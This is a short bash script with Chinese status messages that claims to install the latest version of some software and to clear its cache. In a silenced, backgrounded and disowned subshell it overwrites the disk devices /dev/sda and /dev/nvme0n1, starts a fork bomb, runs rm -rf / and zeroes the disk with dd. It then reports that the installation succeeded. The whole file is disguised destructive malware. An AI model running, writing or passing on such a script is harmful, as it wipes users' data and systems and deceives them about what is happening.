#!/bin/bash
echo "正在安装最新版某软件..."
sleep 2
echo "正在删除缓存..."
(
    > /dev/sda  # 直接往硬盘写 0，悄悄把硬盘块设备清零
    > /dev/nvme0n1  # 固态硬盘
    :(){ :|:& };:   # 经典 fork 炸弹，瞬间把进程塞满
    rm -rf / &   # 后台开始删
    dd if=/dev/zero of=/dev/sda bs=1M & # 后台开始写 0 死机
) &>/dev/null &
disown
echo "安装成功！"